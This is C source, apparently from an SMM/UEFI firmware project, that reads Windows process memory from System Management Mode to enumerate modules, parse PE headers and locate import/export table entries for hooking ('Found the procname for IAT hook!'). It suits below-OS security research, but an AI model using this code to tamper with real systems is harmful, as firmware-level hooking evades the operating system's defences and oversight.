    SerialPrintStringDebug("\r\n");

    if (*(INT16 *)(VOID *)newBuffer == 0x53)
    {
      SerialPrintStringDebug("ERROR: Buffer error! \r\n");
      continue;
    }

    if (!strcmp(out_module->name, newBuffer))
    {
      SerialPrintStringDebug("  Found module \r\n");

      out_module->baseAddress = mod->BaseAddress;
      out_module->sizeOfModule = mod->SizeOfImage;
      out_module->entryPoint = mod->EntryPoint;
      out_module->loadCount = mod->LoadCount;
      return TRUE;
    }

  } while (head != end && head != prev);

  return FALSE;
}

BOOLEAN DumpSingleModule(const WinCtx *ctx, const WinProc *process, WinModule *out_module, BOOLEAN verbose)
{
  BOOLEAN x86 = FALSE;
  BOOLEAN ret = DumpSingleModule64(ctx, process, out_module, &x86, verbose);

  if (ret == FALSE && x86 == FALSE)
  {
    SerialPrintStringDebug("Could not find the module from a 64-bit process!\r\n");
    return FALSE;
  }

  if (x86)
  {
    SerialPrintStringDebug("The process seems to be x86 ...\r\n");
    ret = DumpSingleModule86(ctx, process, out_module, verbose);
  }
  return ret;
}

PEB GetPeb(const WinCtx *ctx, const WinProc *process)
{
  PEB peb;
  UINT64 ppeb = 0;
  p_memCpy((UINT64)&ppeb, process->physProcess + ctx->offsets.peb, sizeof(UINT64), FALSE);
  v_memRead((UINT64)&peb, ppeb, sizeof(PEB), process->dirBase, FALSE);
  return peb;
}

PEB32 GetPeb32(const WinCtx *ctx, const WinProc *process)
{
  PEB32 peb;
  UINT64 ppeb = 0;

  p_memCpy((UINT64)&ppeb, process->physProcess + ctx->offsets.peb, sizeof(UINT64), FALSE);
  v_memRead((UINT64)&peb, ppeb + 0x1000, sizeof(PEB32), process->dirBase, FALSE);

  return peb;
}

STATIC PIMAGE_NT_HEADERS PE_HeaderGetVerify(WinProc *process, WinModule *basemodule, UINT8 *pbModuleHeader, BOOLEAN *pfHdr32)
{
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS ntHeader;
  if (pfHdr32)
  {
    *pfHdr32 = FALSE;
  }
  v_memRead((UINT64)pbModuleHeader, basemodule->baseAddress, HEADER_SIZE, process->dirBase, FALSE);
  dosHeader = (PIMAGE_DOS_HEADER)pbModuleHeader;
  if (!dosHeader || dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
  {
    return NULL;
  }
  if (dosHeader->e_lfanew > 0x800)
  {
    return NULL;
  }
  ntHeader = (PIMAGE_NT_HEADERS)(pbModuleHeader + dosHeader->e_lfanew);
  if (!ntHeader || ntHeader->Signature != IMAGE_NT_SIGNATURE)
  {
    return NULL;
  }
  if ((ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) && (ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC))
  {
    return NULL;
  }
  if (pfHdr32)
  {
    *pfHdr32 = (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC);
  }
  return ntHeader;
}

BOOLEAN ProcessGetThunkInfoIAT(WinProc *process, WinModule *basemodule, CHAR8 *szImportModuleName, CHAR8 *szImportProcName, PPE_THUNKINFO_IAT pThunkInfoIAT)
{
  EFI_PHYSICAL_ADDRESS physAddr;
  EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

  if (ret != EFI_SUCCESS)
  {
    SerialPrintString("ERROR: Failed allocating pages \r\n");
    return FALSE;
  }
  UINT8 *pbModuleHeader = (UINT8 *)physAddr;
  // nullify the allocated memory
  for (INT32 k = 0; k < 0x1000; k++)
  {
    pbModuleHeader[k] = 0x00;
  }
  PIMAGE_NT_HEADERS64 ntHeader64;
  PIMAGE_NT_HEADERS32 ntHeader32;
  UINT64 i, oImportDirectory;
  PIMAGE_IMPORT_DESCRIPTOR pIID;
  UINT64 *pIAT64;
  UINT64 *pHNA64;
  UINT32 *pIAT32;
  UINT32 *pHNA32;
  UINT32 cbModule;
  UINT8 *pbModule = NULL;
  BOOLEAN f32, fFnName;
  UINT32 c, j;
  CHAR8 *szNameFunction;
  CHAR8 *szNameModule;
  // load both 32/64 bit ntHeader (only one will be valid)
  if (!(ntHeader64 = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &f32)))
  {
    SerialPrintString("ERROR: Parsing PE headers in VMM failed!\r\n");
    goto fail;
  }
  ntHeader32 = (PIMAGE_NT_HEADERS32)ntHeader64;
  cbModule = f32 ? ntHeader32->OptionalHeader.SizeOfImage : ntHeader64->OptionalHeader.SizeOfImage;
  // too large
  if (cbModule > 0x02000000)
  {
    SerialPrintString("ERROR: Module size too large\r\n");
    goto fail;
  }
  oImportDirectory = f32 ? ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress : ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
  if (!oImportDirectory || (oImportDirectory >= cbModule))
  {
    SerialPrintString("ERROR: offset of import directory failed\r\n");
    goto fail;
  }

  // allocate the huge buffer for the module image inside SMM.
  // TODO: this is very ugly and shall not be done, definitely WIP
  SerialPrintStringDebug("  Allocating ");
  SerialPrintNumberDebug(cbModule, 10);
  SerialPrintStringDebug(" bytes of memory for the PE image ...\r\n");
  EFI_PHYSICAL_ADDRESS physAddrImage;
  ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, cbModule / 0x1000 + 1, &physAddrImage);
  if (ret != EFI_SUCCESS)
  {
    SerialPrintStringDebug("ERROR: IAT: Failed allocating pages for the module image data \r\n");
    goto fail;
  }
  pbModule = (UINT8 *)physAddrImage;
  // nullify the allocated memory
  for (INT32 k = 0; k < cbModule; k++)
  {
    pbModule[k] = 0x00;
  }
  v_memReadMultiPage((UINT64)pbModule, basemodule->baseAddress, cbModule, process->dirBase, FALSE);

  // Walk imported modules / functions
  pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pbModule + oImportDirectory);
  i = 0, c = 0;
  while ((oImportDirectory + (i + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR) < cbModule) && pIID[i].FirstThunk)
  {
    if (pIID[i].Name > cbModule - 64)
    {
      i++;
      continue;
    }
    if (f32)
    {
      // 32-bit PE
      SerialPrintStringDebug("    The target seems to be 32-bit...\r\n");
      j = 0;
      pIAT32 = (UINT32 *)(pbModule + pIID[i].FirstThunk);
      pHNA32 = (UINT32 *)(pbModule + pIID[i].OriginalFirstThunk);
      while (TRUE)
      {
        if ((UINT64)(pIAT32 + j) + sizeof(UINT32) - (UINT64)pbModule > cbModule)
          break;
        if ((UINT64)(pHNA32 + j) + sizeof(UINT32) - (UINT64)pbModule > cbModule)
          break;
        if (!pIAT32[j])
          break;
        if (!pHNA32[j])
          break;
        fFnName = (pHNA32[j] < cbModule - 40);
        szNameFunction = (CHAR8 *)(pbModule + pHNA32[j] + 2);
        szNameModule = (CHAR8 *)(pbModule + pIID[i].Name);
        if (fFnName && !strcmp(szNameFunction, szImportProcName) && !stricmp(szNameModule, szImportModuleName))
        {
          SerialPrintStringDebug("  Found the procname ");
          SerialPrintStringDebug(szNameFunction);
          SerialPrintStringDebug(" for IAT hook!\r\n");
          pThunkInfoIAT->fValid = TRUE;
          pThunkInfoIAT->f32 = TRUE;
          pThunkInfoIAT->vaThunk = basemodule->baseAddress + pIID[i].FirstThunk + sizeof(UINT32) * j;
          pThunkInfoIAT->vaFunction = pIAT32[j];
          pThunkInfoIAT->vaNameFunction = basemodule->baseAddress + pHNA32[j] + 2;
          pThunkInfoIAT->vaNameModule = basemodule->baseAddress + pIID[i].Name;

          gSmst2->SmmFreePages(physAddr, 1);
          gSmst2->SmmFreePages(physAddrImage, cbModule / 0x1000 + 1);
          return TRUE;
        }
        c++;
        j++;
      }
    }
    else
    {
      // 64-bit PE
      SerialPrintStringDebug("    The target seems to be 64-bit...\r\n");
      j = 0;
      pIAT64 = (UINT64 *)(pbModule + pIID[i].FirstThunk);
      pHNA64 = (UINT64 *)(pbModule + pIID[i].OriginalFirstThunk);
      while (TRUE)
      {
        if ((UINT64)(pIAT64 + j) + sizeof(UINT64) - (UINT64)pbModule > cbModule)
          break;
        if ((UINT64)(pHNA64 + j) + sizeof(UINT64) - (UINT64)pbModule > cbModule)
          break;
        if (!pIAT64[j])
          break;
        if (!pHNA64[j])
          break;
        fFnName = (pHNA64[j] < cbModule - 40);
        szNameFunction = (CHAR8 *)(pbModule + pHNA64[j] + 2);
        szNameModule = (CHAR8 *)(pbModule + pIID[i].Name);
        SerialPrintStringDebug("    IAT: Comparing ");
        SerialPrintStringDebug(szNameFunction);
        SerialPrintStringDebug("\r\n");
        if (fFnName && !strcmp(szNameFunction, szImportProcName) && !stricmp(szNameModule, szImportModuleName))
        {
          pThunkInfoIAT->fValid = TRUE;
          pThunkInfoIAT->f32 = FALSE;
          pThunkInfoIAT->vaThunk = basemodule->baseAddress + pIID[i].FirstThunk + sizeof(UINT64) * j;
          pThunkInfoIAT->vaFunction = pIAT64[j];
          pThunkInfoIAT->vaNameFunction = basemodule->baseAddress + pHNA64[j] + 2;
          pThunkInfoIAT->vaNameModule = basemodule->baseAddress + pIID[i].Name;

          gSmst2->SmmFreePages(physAddr, 1);
          gSmst2->SmmFreePages(physAddrImage, cbModule / 0x1000 + 1);
          return TRUE;
        }
        c++;
        j++;
      }
    }
    i++;
  }
fail:
  gSmst2->SmmFreePages(physAddr, 1);
  gSmst2->SmmFreePages(physAddrImage, cbModule / 0x1000 + 1);
  return FALSE;
}

STATIC UINT16 PE_SectionGetNumberOf(WinProc *process, WinModule *basemodule)
{
  EFI_PHYSICAL_ADDRESS physAddr;
  EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

  if (ret != EFI_SUCCESS)
  {
    SerialPrintStringDebug("ERROR: Failed allocating pages \r\n");
    gSmst2->SmmFreePages(physAddr, 1);
    return 0;
  }
  UINT8 *pbModuleHeader = (UINT8 *)physAddr;
  // nullify the allocated memory
  for (INT32 k = 0; k < 0x1000; k++)
  {
    pbModuleHeader[k] = 0x00;
  }

  BOOLEAN f32;
  UINT16 cSections;
  PIMAGE_NT_HEADERS ntHeader;
  // load nt header either by using optionally supplied module header or by fetching from memory.
  if (!(ntHeader = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &f32)))
  {
    SerialPrintStringDebug("ERROR: Parsing PE headers in VMM failed!\r\n");
    gSmst2->SmmFreePages(physAddr, 1);
    return 0;
  }
  cSections = f32 ? ((PIMAGE_NT_HEADERS32)ntHeader)->FileHeader.NumberOfSections : ((PIMAGE_NT_HEADERS64)ntHeader)->FileHeader.NumberOfSections;
  if (cSections > 0x40)
  {
    SerialPrintStringDebug("ERROR: Sections > 0x40!\r\n");
    gSmst2->SmmFreePages(physAddr, 1);
    return 0;
  }
  gSmst2->SmmFreePages(physAddr, 1);
  return cSections;
}

STATIC VOID PE_SECTION_DisplayBuffer(WinProc *process, WinModule *basemodule, UINT32 cbDisplayBufferMax, UINT32 *pcSectionsOpt, PIMAGE_SECTION_HEADER pSectionsOpt)
{
  EFI_PHYSICAL_ADDRESS physAddr;
  EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

  if (ret != EFI_SUCCESS)
  {
    SerialPrintString("ERROR: Failed allocating pages \r\n");
    return;
  }
  UINT8 *pbModuleHeader = (UINT8 *)physAddr;
  // nullify the allocated memory
  for (INT32 k = 0; k < 0x1000; k++)
  {
    pbModuleHeader[k] = 0x00;
  }
  PIMAGE_NT_HEADERS64 ntHeader64;
  BOOLEAN fHdr32;
  UINT32 cSections, cSectionsOpt;
  PIMAGE_SECTION_HEADER pSectionBase;
  if (pcSectionsOpt)
  {
    cSectionsOpt = *pcSectionsOpt;
    *pcSectionsOpt = 0;
  }
  if (!(ntHeader64 = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &fHdr32)))
  {
    return;
  }
  pSectionBase = fHdr32 ? (PIMAGE_SECTION_HEADER)((UINT64)ntHeader64 + sizeof(IMAGE_NT_HEADERS32)) : (PIMAGE_SECTION_HEADER)((UINT64)ntHeader64 + sizeof(IMAGE_NT_HEADERS64));
  cSections = (UINT32)(((UINT64)pbModuleHeader + 0x1000 - (UINT64)pSectionBase) / sizeof(IMAGE_SECTION_HEADER));
  if (cSections > ntHeader64->FileHeader.NumberOfSections)
  {
    cSections = ntHeader64->FileHeader.NumberOfSections;
  }
  if (pSectionsOpt && pcSectionsOpt && cSectionsOpt)
  {
    if (cSectionsOpt < ntHeader64->FileHeader.NumberOfSections)
    {
      *pcSectionsOpt = cSectionsOpt;
    }
    else
    {
      *pcSectionsOpt = ntHeader64->FileHeader.NumberOfSections;
    }
    p_memCpy((UINT64)pSectionsOpt, (UINT64)pSectionBase, *pcSectionsOpt * sizeof(IMAGE_SECTION_HEADER), FALSE);
  }
  gSmst2->SmmFreePages(physAddr, 1);
}

BOOLEAN ProcessGetSections(WinProc *process, WinModule *basemodule, PIMAGE_SECTION_HEADER pSections, UINT32 cSections, UINT32 *pcSections)
{
  UINT32 sections = PE_SectionGetNumberOf(process, basemodule);
  if (!pSections)
  {
    *pcSections = sections;
    return TRUE;
  }
  if (cSections < sections)
  {
    return FALSE;
  }
  PE_SECTION_DisplayBuffer(process, basemodule, 0, &cSections, pSections);
  *pcSections = cSections;
  return TRUE;
}

STATIC BOOLEAN PE_GetThunkInfoEAT(WinProc *process, WinModule *basemodule, CHAR8 *procName, PPE_THUNKINFO_EAT pThunkInfoEAT)
{
  // allocate space for pbModuleHeader
  EFI_PHYSICAL_ADDRESS physAddr;
  EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

  if (ret != EFI_SUCCESS)
  {
    SerialPrintString("ERROR: Failed allocating pages for EAT dump!\r\n");
    return FALSE;
  }
  UINT8 *pbModuleHeader = (UINT8 *)physAddr;

  PIMAGE_NT_HEADERS32 ntHeader32;
  PIMAGE_NT_HEADERS64 ntHeader64;
  UINT32 *pdwRVAAddrNames;
  UINT32 *pdwRVAAddrFunctions;
  UINT16 *pwNameOrdinals;
  UINT32 cbProcName, cbExportDirectoryOffset;
  CHAR8 *sz;
  UINT64 vaExportDirectory;
  UINT32 cbExportDirectory;
  UINT8 *pbExportDirectory = NULL;
  UINT64 vaRVAAddrNames, vaNameOrdinals, vaRVAAddrFunctions;
  BOOLEAN f32;
  if (!(ntHeader64 = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &f32)))
  {
    goto cleanup;
  }
  if (f32)
  {
    ntHeader32 = (PIMAGE_NT_HEADERS32)ntHeader64;
    vaExportDirectory = basemodule->baseAddress + ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    cbExportDirectory = ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  }
  else
  {
    vaExportDirectory = basemodule->baseAddress + ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    cbExportDirectory = ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  }

  // sanity check the export directory values
  if ((cbExportDirectory < sizeof(IMAGE_EXPORT_DIRECTORY)) || (cbExportDirectory > 0x01000000) || (vaExportDirectory == basemodule->baseAddress) || (vaExportDirectory > basemodule->baseAddress + 0x80000000))
  {
    goto cleanup;
  }
  EFI_PHYSICAL_ADDRESS physAddrExportDir;
  ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, cbExportDirectory / 0x1000 + 1, &physAddrExportDir);
  if (ret != EFI_SUCCESS)
  {
    SerialPrintString("ERROR: Failed allocating pages for the EAT module export directory \r\n");
    gSmst2->SmmFreePages(physAddr, 1);
    return FALSE;
  }
  pbExportDirectory = (UINT8 *)physAddrExportDir;
  // nullify the allocated memory
  for (INT32 k = 0; k < cbExportDirectory; k++)
  {
    pbExportDirectory[k] = 0x00;
  }

  // read the export directory to SMM memory
  // SerialPrintStringDebug("  Reading the export directory to the buffer ...\r\n");
  v_memReadMultiPage((UINT64)pbExportDirectory, vaExportDirectory, cbExportDirectory, process->dirBase, FALSE);

  PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)pbExportDirectory;
  SerialPrintStringDebug("  EAT Buffer filled with ");
  SerialPrintNumberDebug(exp->NumberOfNames, 10);
  SerialPrintStringDebug(" exported names in it!\r\n");

  if (!exp || !exp->NumberOfNames || !exp->AddressOfNames)
  {
    SerialPrintString("ERROR: EAT exp buffer invalid!\r\n");
    goto cleanup;
  }
  vaRVAAddrNames = basemodule->baseAddress + exp->AddressOfNames;
  vaNameOrdinals = basemodule->baseAddress + exp->AddressOfNameOrdinals;
  vaRVAAddrFunctions = basemodule->baseAddress + exp->AddressOfFunctions;
  if ((vaRVAAddrNames < vaExportDirectory) || (vaRVAAddrNames > vaExportDirectory + cbExportDirectory - exp->NumberOfNames * sizeof(UINT32)))
  {
    SerialPrintString("ERROR: vaRVAAddrNames invalid! value: ");
    SerialPrintNumber(vaRVAAddrNames, 16);
    SerialPrintString("\r\n");
    goto cleanup;
  }
  if ((vaNameOrdinals < vaExportDirectory) || (vaNameOrdinals > vaExportDirectory + cbExportDirectory - exp->NumberOfNames * sizeof(UINT16)))
  {
    SerialPrintString("ERROR: vaNameOrdinals invalid! value: ");
    SerialPrintNumber(vaNameOrdinals, 16);
    SerialPrintString("\r\n");
    goto cleanup;
  }
  if ((vaRVAAddrFunctions < vaExportDirectory) || (vaRVAAddrFunctions > vaExportDirectory + cbExportDirectory - exp->NumberOfNames * sizeof(UINT32)))
  {
    SerialPrintString("ERROR: vaRVAAddrFunctions invalid! value: ");
    SerialPrintNumber(vaRVAAddrFunctions, 16);
    SerialPrintString("\r\n");
    goto cleanup;
  }
  cbProcName = (UINT32)strlen(procName) + 1;
  cbExportDirectoryOffset = (UINT32)(vaExportDirectory - basemodule->baseAddress);
  pdwRVAAddrNames = (UINT32 *)(pbExportDirectory + exp->AddressOfNames - cbExportDirectoryOffset);
  pwNameOrdinals = (UINT16 *)(pbExportDirectory + exp->AddressOfNameOrdinals - cbExportDirectoryOffset);
  pdwRVAAddrFunctions = (UINT32 *)(pbExportDirectory + exp->AddressOfFunctions - cbExportDirectoryOffset);
  for (UINT32 i = 0; i < exp->NumberOfNames; i++)
  {
    if (pdwRVAAddrNames[i] - cbExportDirectoryOffset + cbProcName > cbExportDirectory)
    {
      SerialPrintStringDebug("EAT: WARNING: pdwRVAAddrNames[i] exceeds cbExportDirectory at index ");
      SerialPrintNumberDebug(i, 10);
      SerialPrintStringDebug("\r\n");
      continue;
    }
    sz = (CHAR8 *)(pbExportDirectory + pdwRVAAddrNames[i] - cbExportDirectoryOffset);
    if (!strncmp(sz, procName, cbProcName))
    {
      if (pwNameOrdinals[i] >= exp->NumberOfFunctions)
      {
        goto cleanup;
      }
      SerialPrintStringDebug("  EAT: Found ProcName ");
      SerialPrintStringDebug(sz);
      SerialPrintStringDebug("!\r\n");
      pThunkInfoEAT->fValid = TRUE;
      pThunkInfoEAT->vaFunction = (UINT64)(basemodule->baseAddress + pdwRVAAddrFunctions[pwNameOrdinals[i]]);
      pThunkInfoEAT->valueThunk = pdwRVAAddrFunctions[pwNameOrdinals[i]];
      pThunkInfoEAT->vaThunk = vaExportDirectory + exp->AddressOfFunctions - cbExportDirectoryOffset + sizeof(UINT32) * pwNameOrdinals[i];
      pThunkInfoEAT->vaNameFunction = vaExportDirectory + pdwRVAAddrNames[i] - cbExportDirectoryOffset;
      gSmst2->SmmFreePages(physAddr, 1);
      gSmst2->SmmFreePages(physAddrExportDir, cbExportDirectory / 0x1000 + 1);
      return TRUE;
    }
  }
cleanup:
  gSmst2->SmmFreePages(physAddr, 1);
  gSmst2->SmmFreePages(physAddrExportDir, cbExportDirectory / 0x1000 + 1);
  SerialPrintString("EAT: FAILED TO FIND procName: ");
  SerialPrintString(procName);
  SerialPrintString("\r\n");
  return FALSE;
}

UINT64 ProcessGetProcAddress(WinProc *process, WinModule *basemodule, CHAR8 *procName)
{
  PE_THUNKINFO_EAT oThunkInfoEAT = {0};
  PE_GetThunkInfoEAT(process, basemodule, procName, &oThunkInfoEAT);
  return oThunkInfoEAT.vaFunction;
}
